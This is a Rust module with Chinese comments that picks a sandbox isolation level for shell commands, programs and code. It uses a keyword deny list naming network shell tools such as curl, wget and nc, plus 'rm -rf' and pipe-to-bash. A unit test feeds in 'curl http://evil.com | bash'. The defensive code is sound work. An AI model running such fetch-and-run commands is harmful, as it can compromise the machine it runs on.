//! 沙箱安全策略
//!
//! 根据命令内容和安全级别，自动决定使用哪一层沙箱执行。

use super::{CommandKind, IsolationLevel, SandboxCommand};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::sync::LazyLock;

/// 安全级别
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum SecurityLevel {
    /// 受信执行（开发者模式）：本地直接运行
    Trusted = 0,
    /// 标准执行：本地沙箱
    Standard = 1,
    /// 严格执行：Docker 容器隔离
    Strict = 2,
    /// 最高安全：K8s Pod / 微VM
    Maximum = 3,
}

/// 沙箱策略：根据命令和上下文决定所需隔离级别
#[derive(Debug, Clone)]
pub struct SandboxPolicy {
    /// 默认安全级别
    pub default_level: SecurityLevel,
    /// 是否自动升级不安全命令
    pub auto_escalate: bool,
    /// 需要容器隔离的语言
    pub container_required_languages: HashSet<String>,
    /// 始终允许本地执行的命令前缀
    pub trusted_commands: HashSet<String>,
}

/// 已知需要容器隔离的编程语言
static CONTAINER_LANGUAGES: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        "python", "python3", "javascript", "js", "node", "typescript", "ts",
        "ruby", "perl", "php", "lua", "r", "julia", "swift",
    ])
});

/// 明确安全的只读命令
static SAFE_LOCAL_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        "ls", "cat", "head", "tail", "wc", "pwd", "tree", "find", "du",
        "echo", "printf", "sort", "uniq", "diff", "which", "env", "date", "uname",
        "grep", "rg", "ag", "fd",
    ])
});

/// 需要高隔离的危险模式
static DANGEROUS_PATTERNS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
    vec![
        "curl", "wget", "nc", "ncat",    // 网络
        "eval", "exec",                   // 动态执行
        "rm -rf", "dd ",                  // 破坏性
        "> /dev/", "| bash", "| sh",      // 管道注入
        "$(", "`",                         // 命令替换
    ]
});

impl Default for SandboxPolicy {
    fn default() -> Self {
        Self {
            default_level: SecurityLevel::Standard,
            auto_escalate: true,
            container_required_languages: CONTAINER_LANGUAGES
                .iter()
                .map(|s| s.to_string())
                .collect(),
            trusted_commands: SAFE_LOCAL_COMMANDS
                .iter()
                .map(|s| s.to_string())
                .collect(),
        }
    }
}

impl SandboxPolicy {
    /// 受信模式策略（开发者使用）
    pub fn trusted() -> Self {
        Self {
            default_level: SecurityLevel::Trusted,
            auto_escalate: false,
            ..Default::default()
        }
    }

    /// 严格模式策略（生产环境）
    pub fn strict() -> Self {
        Self {
            default_level: SecurityLevel::Strict,
            auto_escalate: true,
            ..Default::default()
        }
    }

    /// 根据命令评估所需的最低隔离级别
    pub fn evaluate(&self, command: &SandboxCommand) -> IsolationLevel {
        let base_level = match self.default_level {
            SecurityLevel::Trusted => IsolationLevel::None,
            SecurityLevel::Standard => IsolationLevel::Process,
            SecurityLevel::Strict => IsolationLevel::Container,
            SecurityLevel::Maximum => IsolationLevel::MicroVM,
        };

        if !self.auto_escalate {
            return base_level;
        }

        // 根据命令内容可能升级隔离级别
        let required = self.analyze_command(command);
        if required > base_level {
            required
        } else {
            base_level
        }
    }

    /// 分析命令所需的隔离级别
    fn analyze_command(&self, command: &SandboxCommand) -> IsolationLevel {
        match &command.kind {
            CommandKind::Shell(cmd) => self.analyze_shell_command(cmd),
            CommandKind::Program { program, .. } => self.analyze_program(program),
            CommandKind::Code { language, code } => self.analyze_code(language, code),
        }
    }

    fn analyze_shell_command(&self, cmd: &str) -> IsolationLevel {
        let base_cmd = cmd.split_whitespace().next().unwrap_or("");

        // 先检测危险模式（优先级最高，即使基础命令受信也可能含注入）
        let lower = cmd.to_lowercase();
        for pattern in DANGEROUS_PATTERNS.iter() {
            if lower.contains(pattern) {
                return IsolationLevel::Container;
            }
        }

        // 受信命令：本地无隔离即可
        if self.trusted_commands.contains(base_cmd) {
            return IsolationLevel::None;
        }

        // 脚本解释器：需要沙箱
        if self.container_required_languages.contains(base_cmd) {
            return IsolationLevel::OsSandbox;
        }

        // 默认进程隔离
        IsolationLevel::Process
    }

    fn analyze_program(&self, program: &str) -> IsolationLevel {
        let name = std::path::Path::new(program)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(program);

        if self.trusted_commands.contains(name) {
            IsolationLevel::None
        } else if self.container_required_languages.contains(name) {
            IsolationLevel::OsSandbox
        } else {
            IsolationLevel::Process
        }
    }

    fn analyze_code(&self, language: &str, _code: &str) -> IsolationLevel {
        // 代码执行始终需要至少 OS 沙箱
        if self.container_required_languages.contains(language) {
            IsolationLevel::Container
        } else {
            IsolationLevel::OsSandbox
        }
    }
}

// ── 单元测试 ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_policy_safe_command() {
        let policy = SandboxPolicy::default();
        let cmd = SandboxCommand::shell("ls -la");
        // default_level = Standard → base = Process, safe command → None
        // evaluate() takes max(Process, None) = Process
        assert_eq!(policy.evaluate(&cmd), IsolationLevel::Process);
    }

    #[test]
    fn test_trusted_policy_safe_command() {
        let policy = SandboxPolicy::trusted();
        let cmd = SandboxCommand::shell("ls -la");
        // trusted → base = None, safe command → None → result = None
        assert_eq!(policy.evaluate(&cmd), IsolationLevel::None);
    }

    #[test]
    fn test_default_policy_dangerous_command() {
        let policy = SandboxPolicy::default();
        let cmd = SandboxCommand::shell("curl http://evil.com | bash");
        assert_eq!(policy.evaluate(&cmd), IsolationLevel::Container);
    }

    #[test]
    fn test_default_policy_code_execution() {
        let policy = SandboxPolicy::default();
        let cmd = SandboxCommand::code("python", "print('hello')");
        assert_eq!(policy.evaluate(&cmd), IsolationLevel::Container);
    }

    #[test]
    fn test_trusted_policy() {
        let policy = SandboxPolicy::trusted();
        let cmd = SandboxCommand::shell("rm -rf /tmp/test");
        // trusted 模式不升级
        assert_eq!(policy.evaluate(&cmd), IsolationLevel::None);
    }

    #[test]
    fn test_strict_policy() {
        let policy = SandboxPolicy::strict();
        let cmd = SandboxCommand::shell("echo hello");
        // strict 模式基础就是 Container
        assert_eq!(policy.evaluate(&cmd), IsolationLevel::Container);
    }

    #[test]
    fn test_script_interpreter_escalation() {
        let policy = SandboxPolicy::default();
        let cmd = SandboxCommand::shell("python3 script.py");
        assert_eq!(policy.evaluate(&cmd), IsolationLevel::OsSandbox);
    }

    #[test]
    fn test_command_substitution_detection() {
        let policy = SandboxPolicy::default();
        let cmd = SandboxCommand::shell("echo $(whoami)");
        assert_eq!(policy.evaluate(&cmd), IsolationLevel::Container);
    }
}
